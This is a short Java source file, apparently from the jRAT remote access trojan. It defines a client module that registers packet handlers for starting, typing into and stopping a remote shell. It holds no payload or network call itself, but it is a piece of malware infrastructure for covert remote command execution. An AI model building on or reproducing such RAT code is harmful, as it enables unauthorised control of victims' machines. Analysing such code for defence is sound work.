package jrat.module.shell;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;
import jrat.module.shell.packets.Packet22RemoteShellTyped;
import jrat.module.shell.packets.Packet23RemoteShellStart;
import jrat.module.shell.packets.Packet24RemoteShellStop;

public class ShellClientModule extends ClientModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 22, Packet22RemoteShellTyped.class);
        IncomingPackets.register((short) 23, Packet23RemoteShellStart.class);
        IncomingPackets.register((short) 24, Packet24RemoteShellStop.class);
    }
}
